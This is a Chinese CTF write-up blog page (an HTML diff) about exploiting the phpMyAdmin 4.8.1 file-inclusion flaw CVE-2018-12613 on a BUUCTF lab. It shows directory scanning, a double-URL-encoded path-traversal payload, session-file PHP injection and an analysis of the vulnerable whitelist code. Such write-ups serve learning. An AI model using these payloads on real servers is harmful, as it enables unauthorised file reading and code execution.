@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    BUU- [GWCTF 2019] |  
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-2020-9-27buuctf"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  BUU- [GWCTF 2019]
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/09/27/2020-9-27buuctf/" class="article-date">
+  <time datetime="2020-09-27T03:12:15.040Z" itemprop="datePublished">2020-09-27</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">1k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">4 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>Welcome to <a target="_blank" rel="noopener" href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
+<blockquote>
+<p>phpmyadmin (CVE-2018-12613)任意文件包含漏洞。影响版本4.8.0–4.8.1</p>
+<a id="more"></a>
+</blockquote>
+<h3 id="打开网页，神马也不是。"><a href="#打开网页，神马也不是。" class="headerlink" title="打开网页，神马也不是。"></a>打开网页，神马也不是。</h3><p><img src="/2020/09/27/2020-9-27buuctf/image-20200925180115693.png" alt="image-20200925180115693"></p>
+<h3 id="F12没有信息，直接扫网站后台"><a href="#F12没有信息，直接扫网站后台" class="headerlink" title="F12没有信息，直接扫网站后台"></a>F12没有信息，直接扫网站后台</h3><blockquote>
+<p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://10b9238b-d123-4f63-891c-33ce01e55ca1.node3.buuoj.cn/">http://10b9238b-d123-4f63-891c-33ce01e55ca1.node3.buuoj.cn/</a> -e *  -s  0.05</p>
+</blockquote>
+<p> 刚开始没有扫出来，全是429，可能太快了，  就在后面加了个 -s  延迟一下</p>
+<p><img src="/2020/09/27/2020-9-27buuctf/image-20200925230015691-1601176648752.png" alt="image-20200925230015691"></p>
+<p>发现phpmyadmin ,phpinfo.php(没信息)</p>
+<p>直接进入数据库。查看版本4.8.1</p>
+<p>然后就百度该版本漏洞，发现有 任意文件包含和任意代码执行漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6592">CVE-2018-12613 phpMyAdmin远程文件包含漏洞</a></p>
+<p>传入<code>?target=db_datadict.php%253f</code>，<code>%253f</code>开始服务器自动解码一次为<code>%3f</code>，然后<code>urldecode</code>函数再解码一次为<code>?</code>，则满足截取?之前的内容在白名单中，返回<code>true</code>。而在<code>index.php</code>中只解码一次为<code>db_datadict.php%3f</code></p>
+<h3 id="目录穿越，任意文件包含pyload："><a href="#目录穿越，任意文件包含pyload：" class="headerlink" title="目录穿越，任意文件包含pyload："></a>目录穿越，任意文件包含pyload：</h3><blockquote>
+<p>?target=db_sql.php%253f/../../../../../../../../flag</p>
+</blockquote>
+<p><img src="2020-9-27buuctf.assets//image-20200926122420288.png" alt="image-20200926122420288"></p>
+<ul>
+<li>session 进行 php 代码执行（session 文件中中记录了执行的操作）</li>
+</ul>
+<p>​        具体方法：SELECT ‘ <code>&lt;?php phpinfo()?&gt;</code> ‘ ;</p>
+<p><img src="2020-9-27buuctf.assets//image-20200926120643739.png" alt="image-20200926120643739"></p>
+<p>然后查看session值,</p>
+<blockquote>
+<p>?target=db_sql.php%253f/../../../../../../../../tmp/sess_fal9idhffq4t112qfa86k5kbo1</p>
+</blockquote>
+<p>可以搜索flag。(没成功)</p>
+<ul>
+<li>网上说写入后门（本题好像不太行，因为没有写入权限），本地搭建的话可以实现。</li>
+</ul>
+<p><img src="/2020/09/27/2020-9-27buuctf/image-20200926122045439.png" alt="image-20200926122045439"></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">后台gertshell</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangyuyang1016/p/12014016.html">参考博客</a></p>
+<hr>
+<h3 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p>​            target 出事了,   满足if判断    即可促发include</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    ! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;target&#x27;</span>])  <span class="comment">//不为空</span></span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;target&#x27;</span>])   <span class="comment">//是字符串</span></span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, $_REQUEST[<span class="string">&#x27;target&#x27;</span>])  <span class="comment">//不以index开头</span></span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">&#x27;target&#x27;</span>], $target_blacklist)  <span class="comment">//不在$target_blacklist中</span></span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">&#x27;target&#x27;</span>])  <span class="comment">//要返回真</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​           $target_blacklist，target参数黑名单  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;$page, <span class="keyword">array</span> $whitelist = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">            $whitelist = <span class="built_in">self</span>::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);    <span class="comment">//解码，</span></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>$whitelist一开始未传参过来，所以会被赋值为self::$goto_whitelist</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> $goto_whitelist = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>如果$page在白名单中就会直接return true，但这里考虑到了可能带参数的情况</p>
+<blockquote>
+<p>  <strong>mb_substr</strong>    ( string <code>$str</code>   , int <code>$start</code>   [, int <code>$length</code> = NULL   [, string <code>$encoding</code> = mb_internal_encoding()  ]] ) : string</p>
+</blockquote>
+<p>   根据字符数执行一个多字节安全的 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.substr.php">substr()</a> 操作。   位置是从 <code>str</code> 的开始位置进行计数。   第一个字符的位置是 0。第二个字符的位置是 1，以此类推。   </p>
+<p>$_page是取出$page问号前的东西，是考虑到target有参数的情况，只要$_page在白名单中就直接return true<br> 但还考虑了url编码的情况，所以如果这步判断未成功，下一步又进行url解码.</p>
+<p>所以传入二次编码后的内容，会让checkPageValidity()这个函数返回true，但index中实际包含的内容却不是白名单中的文件</p>
+<p>例如传入<br> <code>?target=db_datadict.php%253f</code><br> 由于服务器会自动解码一次，所以在checkPageValidity()中，$page的值一开始会是<code>db_datadict.php%3f</code>，又一次url解码后变成了<code>db_datadict.php?</code>，这次便符合了?前内容在白名单的要求，函数返回true<br> 但在index.php中$_REQUEST[‘target’]仍然是<code>db_datadict.php%3f</code>，而且会被include，通过目录穿越，就可造成任意文件包含</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/09/27/2020-9-27buuctf/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/buu%E5%88%B7%E9%A2%98/" rel="tag">buu刷题</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/09/27/2020.9.26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">MSF-永恒之蓝入侵</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020
+        <i class="ri-heart-fill heart_icon"></i> Shmily-ing
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer.png" alt="Shmily-ing"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="https://github.com/Shmily-ing" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
